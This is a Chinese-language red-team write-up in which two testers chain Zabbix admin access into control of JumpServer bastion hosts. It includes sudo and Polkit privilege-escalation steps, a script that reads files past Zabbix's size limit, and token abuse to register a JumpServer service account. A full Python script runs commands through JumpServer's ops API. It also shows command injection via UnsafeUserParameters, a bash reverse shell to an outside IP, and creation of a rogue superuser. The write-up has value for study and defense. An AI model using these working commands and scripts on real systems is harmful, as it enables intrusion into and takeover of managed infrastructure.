# Zabbix与Jumpserver后渗透小记
Hi all，好久不见。

本文记录的是两位朋友在工作时遇到的真实场景，原本21年底答应友人A **`Roc木木`** 把文章发公众号的，一拖就是几个月。最近友人B **`kangkang`** 又遇到了一次相似的环境，索性把两位好友写的东西放到一起来整一篇文章。

TL;DR
-----

围绕拿到zabbix web管理员权限之后的后渗透，通过读文件、执行命令等操作获取jumpserver的权限。

Roc木木の攻击记录
----------

21年底的一次演习活动，本文只记录拿到zabbix权限到拿下内网堡垒机权限的过程。

### 0x01 获取zabbix权限

内网扫描，探测到一个自研的资产监控平台，平台使用Django框架开发，且开了debug模式。触发系统报错后，发现在报错的信息中泄露了zabbix服务器和账号密码。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/dfae752b-c5a5-4ff7-a81d-f97f0949f398.png?raw=true)

通过该zabbix账号密码，进入到zabbix的后台，且当前用户为管理员权限。  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/0747f4b5-62a0-4b4d-b75f-fef0d656fcd4.png?raw=true)

对zabbix系统上监控的主机进行观察和分析，发现jumpserver服务器在zabbix监控主机范围中。  

此时想到wfox关于zabbix权限利用的文章 http://noahblog.360.cn/zabbixgong-ji-mian-wa-jue-yu-li-yong/，初步猜想应当可以借助zabbix读取jumpserver服务器的文件。

### 0x02 获取zabbix server权限

老样子，首先添加zabbix脚本，在创建脚本的时候选择zabbix服务器，然后在监测 --> 最新数据下面筛选zabbix server，并下发脚本执行命令，成功获取zabbix服务器权限。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/4f3e417b-5155-453d-b755-c0c56c0b4577.png?raw=true)

在zabbix server上尝试利用`zabbix_get`命令读取文件，但是出现如下错误：  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/3ab00d2f-bb3e-4140-837c-e3ad60a9be46.png?raw=true)

通过查阅资料且重新检查了一下`zabbix server`的配置后发现，jumpserver是通过`zabbix proxy`进行数据上报，所以只能在接收jumpserver上报数据的`zabbix proxy`服务器上使用`zabbix_get`命令，此外还有一种方法是wfox文章中的第6点，通过添加监控项进行文件读取。实际渗透过程中没有注意到这一点，而是通过拿下了`zabbix proxy`服务器权限来实现的文件读取。  

### 0x03 获取zabbix proxy服务器权限

在获取了`zabbix server`服务器权限后，由于不能直接使用`zabbix_get`命令进行读文件，于是尝试先对`zabbix server`服务器进行提权。

如图所示，服务器是centos，sudo版本为1.8.19p2，遂使用https://github.com/worawit/CVE-2021-3156项目进行提权。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/7c4757b8-60a3-497b-8905-bdef8002d5da.png?raw=true)

直接使用exploit\_defaults\_mailer.py这个脚本进行提权，但是这个脚本在获取sudo版本的时候有一些bug，需要手动修改一下第141行为当前sudo的版本：  

` sudo_vers = [1, 8, 19] # get_sudo_version()  
`

提权成功：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/c6150401-ab7b-481c-9c75-0170e64473ac.png?raw=true)

提权成功后，对主机进行信息收集，发现了一个数据库账号密码（user01/password），且同时发现服务器上存在user01用户，于是尝试用（user01/password）进行横向的SSH爆破，很幸运，成功拿下了`zabbix proxy`服务器的权限。  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/2826b789-caeb-4a30-86a7-80829897f340.png?raw=true)

### 0x04 zabbix任意文件读取  

在`zabbix proxy`服务器上，成功利用`zabbix_get`读取到了jumpserver服务器文件。（此处图片为本地场景复现）

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/0ac4db5e-de4f-4b41-b2be-fe4914ed38fe.png?raw=true)

于是开始思考如何利用zabbix任意文件读去获取jumpserver服务器权限，首先尝试读取jumpserver的配置文件，配置文件默认位置是：/opt/jumpserver/config/config.txt  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/d3e444b0-07cf-49d1-bfb7-b14fe2b53b97.png?raw=true)

jumpserver未对目录进行权限限制，所以可以读取到jumpserver的配置文件信息，但是jumpserver默认是使用docker构建，且数据库和redis都没有映射出来，所以读取出来的redis和数据库账号密码没办法直接利用。  

于是本地搭建jumpserver环境，首先了解了 `/opt/jumpserver` 目录下的目录结构，又根据之前jumpserver的日志文件泄露漏洞，想通过读取日志文件信息，进而获取jumpserver服务器权限，默认的日志文件路径为：`/opt/jumpserver/core/logs/jumpserver.log`

但是`zabbix_get`读取文件内容存在限制，仅能读取小于64KB大小的文件，

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/83292002-59d1-49a5-8fb6-05bb08db008b.png?raw=true)

翻了一下zabbix关于利用`vfs.file.contents`读文件的文档：https://www.zabbix.com/documentation/4.0/en/manual/config/items/itemtypes/zabbix_agent，发现除了`vfs.file.contents`外，还有一个`vfs.file.regexp`操作，大概的意思就是输出特定正则匹配的某一行，然后可以指定从开始和结束的行号。  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/a23133b2-8212-443c-b223-dc8b2ad11743.png?raw=true)

于是利用该方法写了一个简单的任意读文件的脚本（还不够完善），来突破文件读取的大小限制：  

`from __future__ import print_function  
import subprocess

target = "192.168.21.166"  
file = "/opt/jumpserver/core/logs/jumpserver.log"

for i in range(1, 2000):  
    cmd = 'vfs.file.regexp[{file},".*",,{start},{end},]'.format(file=file, start=i, end=i+1)  
    p = subprocess.Popen(["zabbix_get", "-s", target, "-k", cmd], stdout=subprocess.PIPE)  
    result, error = p.communicate()  
    print(result, end="")

`

成功读取任意位置的文件内容：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/63f67279-7f60-4e85-8d33-54f8728a6dc9.png?raw=true)

通过读取配置文件，尝试使用https://paper.seebug.org/1502/文章中说的方法无果，且文章中利用到的如下两个未授权接口，从jumpserver 2.6.2版本开始也被修复。  

`/api/v1/authentication/connection-token/  
/api/v1/users/connection-token/  
`

于是尝试读取redis的dump文件，想通过redis获取缓存中的session，读了很久但是也没有读取到，不知道是缓存中没有session还是其他原因。

还尝试了通过读取数据库文件（/opt/jumpserver/mysql/data/jumpserver/）去获取配置信息，但是数据库文件权限不够，没办法读取。

### 0x05 jumpserver服务账号利用

回看读取到的jumpserver配置文件，发现了jumpserver的两个配置项`SECRET_KEY`和`BOOTSTRAP_TOKEN`

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/4cfc194e-d0c7-4c2d-8378-6f3d1d89e789.png?raw=true)

`SECRET_KEY`比较熟悉，是Django框架中的配置项，`BOOTSTRAP_TOKEN`这个比较眼生，对jumpserver源码进行分析，发现`BOOTSTRAP_TOKEN`是jumpserver中注册服务账号时用来认证的。  

参考jumpserver的官方文档，https://docs.jumpserver.org/zh/master/dev/build，jumpserver的服务架构如下：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/b804c2db-b31b-4629-9dd9-e1a6dd149083.png?raw=true)

jumpserver由多个服务组成，核心是core组件，还包括luna（JumpServer Web Terminal 前端）、lina（前端 UI）、koko（JumpServer 字符协议资产连接组件，支持 SSH, Telnet, MySQL, Kubernets, SFTP, SQL Server）、lion（JumpServer 图形协议资产连接组件，支持 RDP, VNC）组件，各个组件与core之间通过API进行调用。  

各个组件与core之间的API调用是通过`AccessKey`进行认证鉴权，`AccessKey`是在服务启动时通过`BOOTSTRAP_TOKEN`向core模块注册服务账号来获取的，下面是koko模块注册的代码（https://github.com/jumpserver/koko/blob/00cee388993ee6e92889df24aa033d09ce132fc5/pkg/koko/koko.go）

调用`MustLoadValidAccessKey`方法返回AccessKey，

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/406c3946-eae2-4eed-9f88-0e133360d2c9.png?raw=true)

从文件中获取，如果没有则调用`MustRegisterTerminalAccount`方法，这个文件的位置在：/opt/jumpserver/koko/data/keys/.access_key  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/3fb2f623-b8bb-4678-b91b-d0badc269032.png?raw=true)

注册TerminalAccount的流程如下：  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/92e55a70-a228-4450-bf11-c7ab2ad1a75e.png?raw=true)

实际注册服务账号的方法如下  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/f653e4ca-f04f-4a9d-96ee-a4051e68bbc7.png?raw=true)

请求`/api/v1/terminal/terminal-registrations/`接口，并在`Authorization`头中带上`BootstrapToken`即可。  

请求接口

`curl http://192.168.21.166/api/v1/terminal/terminal-registrations/ -H "Authorization: BootstrapToken M0ZDNTRENTYtODA4OS1DRTA0" --data "name=test&comment=koko&type=koko"  
`

会给你一个access key

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/2990e6fc-d0bf-45ed-8075-09c1d14da007.png?raw=true)

或者也可以直接通过读取`/opt/jumpserver/koko/data/keys/.access_key`文件来获取`accesskey`。  

有了`access key`后，就可以通过jumpserver的API进行利用，下面是通过jumpserver ops运维接口执行命令。

1.  首先通过`/api/v1/assets/assets/?offset=0&limit=15&display=1&draw=1` 接口找到想要执行命令的主机
    

`def get_assets_assets(jms_url, auth):  
    url = jms_url + '/api/v1/assets/assets/?offset=0&limit=15&display=1&draw=1'  
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT'  
    headers = {  
        'Accept': 'application/json',  
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002',  
        'Date': datetime.datetime.utcnow().strftime(gmt_form)  
    }

    response = requests.get(url, auth=auth, headers=headers)  
    print(response.text)

`

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/4df52be2-8a83-4f85-a524-1402ffca2803.png?raw=true)

这里需要记住主机的资产ID，和admin_user的内容。  

2.  然后利用`api/v1/ops/command-executions`接口对指定主机执行命令
    

代码如下，修改data中的主机和run\_as内容为第一步找到的id和admin\_user，command为需要执行的命令。

`def get_ops_command_executions(jms_url, auth):  
    url = jms_url + '/api/v1/ops/command-executions/'  
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT'  
    headers = {  
        'Accept': 'application/json',  
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002',  
        'Date': datetime.datetime.utcnow().strftime(gmt_form)  
    }

    data = {"hosts":["fdfafb91-7b0a-425a-b250-56599bfc761b"],"run_as":"973320fd-6f06-4f59-8758-8ee52b6f7283","command":"whoami"}

    response = requests.post(url, auth=auth, headers=headers, data=data)  
    print(response.text)

`

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/3f3271c9-28db-4d1e-9c4c-b257cae54427.png?raw=true)

3.  访问log_url，获取命令执行的结果。
    

`def get_task_log(jms_url, auth):  
    url = jms_url + '/api/v1/ops/celery/task/e70ce2ab-1831-46d0-a4d1-ecc968dce298/log/'  
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT'  
    headers = {  
        'Accept': 'application/json',  
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002',  
        'Date': datetime.datetime.utcnow().strftime(gmt_form)  
    }

    response = requests.get(url, auth=auth, headers=headers)  
    print(response.text)

`

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/dd608644-3e54-43b8-bec3-dcc021e2d538.png?raw=true)

完整的利用脚本如下：  

`# Python 示例  
# pip install requests drf-httpsig  
import requests, datetime, json  
from httpsig.requests_auth import HTTPSignatureAuth

def get_auth(KeyID, SecretID):  
    signature_headers = ['(request-target)', 'accept', 'date']  
    auth = HTTPSignatureAuth(key_id=KeyID, secret=SecretID, algorithm='hmac-sha256', headers=signature_headers)  
    return auth

def get_user_info(jms_url, auth):  
    url = jms_url + '/api/v1/users/users/'  
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT'  
    headers = {  
        'Accept': 'application/json',  
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002',  
        'Date': datetime.datetime.utcnow().strftime(gmt_form)  
    }

    response = requests.get(url, auth=auth, headers=headers)  
    print(response.text)

def post_ops_command_executions(jms_url, auth):  
    url = jms_url + '/api/v1/ops/command-executions/'  
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT'  
    headers = {  
        'Accept': 'application/json',  
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002',  
        'Date': datetime.datetime.utcnow().strftime(gmt_form)  
    }

    data = {"hosts":["fdfafb91-7b0a-425a-b250-56599bfc761b"],"run_as":"973320fd-6f06-4f59-8758-8ee52b6f7283","command":"whoami"}

    response = requests.post(url, auth=auth, headers=headers, data=data)  
    print(response.text)

def get_task_log(jms_url, auth):  
    url = jms_url + '/api/v1/ops/celery/task/e70ce2ab-1831-46d0-a4d1-ecc968dce298/log/'  
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT'  
    headers = {  
        'Accept': 'application/json',  
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002',  
        'Date': datetime.datetime.utcnow().strftime(gmt_form)  
    }

    response = requests.get(url, auth=auth, headers=headers)  
    print(response.text)

def get_assets_assets(jms_url, auth):  
    url = jms_url + '/api/v1/assets/assets/?offset=0&limit=15&display=1&draw=1'  
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT'  
    headers = {  
        'Accept': 'application/json',  
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002',  
        'Date': datetime.datetime.utcnow().strftime(gmt_form)  
    }

    response = requests.get(url, auth=auth, headers=headers)  
    print(response.text)

if __name__ == '__main__':  
    jms_url = 'http://192.168.21.166'  
    KeyID = '75ed41cf-c41d-4117-a892-da9c76698d26'  
    SecretID = 'ce3cdec3-df9e-439a-8824-2cefe15ec95f'

    auth = get_auth(KeyID, SecretID)  
    get_task_log(jms_url, auth)  
    # get_assets_assets(jms_url, auth)

`

脚本可以批量执行命令，jumpserver自身也在被管理清单中，至此成功拿下jumpserver堡垒机。

Roc木木日站唯细不破，名言众多，今日分享比较应景的一则：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/066761d6-4128-45d0-abbd-e4f8374cb1ba.png?raw=true)

kangkangの攻击记录
-------------

### 0x01 获取Zabbix后台权限

一次项目，对部分 ip 进行了全端口扫描，发现一个非常见端口的 apache 页面。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/c147cf05-8bf2-4bd2-822a-5f8fd1061f9a.png?raw=true)

目录扫描探测到了zabbix目录，找到管理后台。  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/ae79120a-7c4d-4c2c-8f25-719182350088.png?raw=true)

默认密码 admin:zabbix，成功登陆。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/d78281cc-7186-4105-ac0c-33e5d6bcaaac.png?raw=true)
  

### 0x02 获取zabbix服务器权限

在 Zabbix Web 上添加脚本，“执行在”选项可根据需求选择，“执行在 Zabbix 服务器” 不需要 开启 EnableRemoteCommands 参数，所以一般控制 Zabbix Web 后可通过该方式在 Zabbix Server 上执行命令拿到服务器权限。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/7bff7b5c-f579-430d-969b-24bce34cd8aa.png?raw=true)

创建完脚本后，找到 server 主机进行执行脚本。选择类型是“执行在 Zabbix 服务器”， 无论选择哪台主机执行脚本，最终都是执行在 Zabbix Server 上。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/3b318669-b5f7-4d25-a2a4-654c98b27732.png?raw=true)

执行命令后收到反弹回来的 shell，默认是 zabbix 权限，权限较低。正好可以借机会试一下最近star比较多的综合提权工具 https://github.com/liamg/traitor，并没有测试成功。

单独试了一下 CVE-2021-4034 Linux Polkit 提权脚本，地址 https://github.com/berdav/CVE-2021-4034。在目标服务器上进行编译、执行，顺利提权。

提权完成后写了公钥，通过 ssh 登陆服务器。开始进行信息搜集，查 history、翻文件、看进程、看连接。没有发现太多有用信息，只找到了数据库配置文件，进程也大都是跟 agent 进行通信。

接下来想扩大战果，还有两个方向：

1、内网横向扫描

2、尝试在Agent上远程执行系统命令

目标当前属于 192.168 段，在history和last当中发现了 10 段地址，粗略检测192、172、10三个网段的存活之后没有新的发现，所以开始着手尝试攻击agent。

### 0x03 获取Zabbix Agent 服务器权限

（1）直接执行命令控制agent

众所周知想在agent上远程执行系统命令需要在 zabbix_agentd.conf 配置文件中开启 `EnableRemoteCommands` 参数 （默认关闭）。

如果在 zabbix_agentd.conf 中开启了 `EnableRemoteCommands=1` 参数，一样可以通过在 web 后台创建脚本的方法，选择在 agent 上执行。但是后台中所有的 agent 都没有开启这个参数。所以需要尝试别的办法。

（2）任意文件读取

通过在fox文章中学到的， Zabbix 的原生监控项中，`vfs.file.contents` 命令可以读取指定文件，但无法读取超过64KB 的文件。且 agent 默认以 zabbix 权限运行，无法读取 history 等敏感文件。

但是我们可以查看 agent 服务器配置，zabbix_get 可能不在环境变量中，可以通过 find命令进行寻找。

`zabbix_get -s 172.19.0.5 -p 10050 -k "vfs.file.contents[/etc/zabbix/zabbix_agentd.conf]"  
`

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/4e3c02d4-8b73-47b4-8d72-a92bad40b427.png?raw=true)

通过读取zabbix agent端的配置文件，可以看到 `EnableRemoteCommands` 确实没有配置 ，但是可以看到配置中开启了fox文章中提到的另一个参数 `UnsafeUserParameters=1`。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/3cbc8e8b-bf17-491e-9b25-ff72cf0ac312.png?raw=true)

当 Zabbiax Agent 的 zabbix_agentd.conf 配置文件开启 `UnsafeUserParameters` 参数的情况下，传参值字符不受限制，只需要找到存在传参的自定义参数UserParameter，就能实现命令注入。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/75783aeb-fc27-4085-a871-3424bc24f9a3.png?raw=true)

起初对漏洞原理不理解，没有搞清楚这里命令注入的意思，后来问过fox才整明白此处命令注入所注入的就是用户自定义的命令。选择一个函数如 chk.ssl_access\[1, && id\]，成功执行命令。

`zabbix_get -s 172.19.0.5 -p 10050 -k "chk.ssl_access[1, && id]"  
`

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/3d73b614-085b-4f10-8073-69f85e750da6.png?raw=true)

### 0x04 获取Jumpserver权限

为了确认该系统有哪些业务，选择了一台标签为 web 的机器，进行反弹 shell。

`zabbix_get -s 172.19.19.19 -p 10050 -k "chk.ssl_access[1, &&bash -i >&/dev/tcp/1.1.1.1/443 0>&1]"  
`

同样使用 CVE-2021-4034 进行提权，查看进程，是一个 java 起的网站， 然后用 nginx 做了访问控制。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/1f0c76be-cf6f-4f05-9f2a-c61c1152ec81.png?raw=true)

打web服务和数据库的过程此处略过。通过 last 命令查看服务器的登陆 ip，发现都是从一个 ip 进行登陆，扫了一下该 ip 的全端口，在一个比较偏的端口发现了jumpserver服务。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/c534518d-274d-487e-be30-27e16493bd6c.png?raw=true)
  

恰巧这台也在 zabbix agent 里，重复之前操作，拿下这台 jumpserver 服务器。

通过自有脚本添加 jumpserver 超级管理员：

`cd /opt/jumpserver/apps  
python manage.py createsuperuser --username=user --email=user@domain.com   
`

成功进入

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/335ee048-2e25-4baf-8939-ad51dd16205d.png?raw=true)

课代表划重点
------

1.  Django的debug有时会闯大祸，同理其他debug也是，例如laravel等等。
    
2.  Agent通过`zabbix proxy`对server进行数据上报的话，只有在`zabbix proxy`服务器上才能agent使用`zabbix_get`命令读取文件。
    
3.  jumpserver的配置文件权限控制不严格，zabbix用户即可读。
    
4.  `vfs.file.regexp` 可以突破 `vfs.file.contents` 读取文件的大小限制。
    
5.  通过配置文件中的`BootstrapToken`和`accesskey`可以实现通过服务账户控制jumpserver内的主机。
    
6.  `EnableRemoteCommands` 参数未开启时可以关注 `UnsafeUserParameters` 参数，避免措施打agent的机会。
    
7.  jumpserver自带的脚本可以直接添加新用户进入系统。
    

注：Roc木木的文章距离当前有一段时间，当时还没有出现  Polkit 和 DirtyPipe 提权。

LAST
----

公众号荒废的这段时间里工作和生活都发生了很多的变化，不过没变的倒是自己一直以来疯狂欠学习的状态。有趣的事情倒是也遇到过一些、写过一些，有机会的话再发一发。

两年多的时间风云变幻，疾病、战争、行业风口更迭，感谢还在关注的大伙们，祝大家健康平安，诸事顺遂。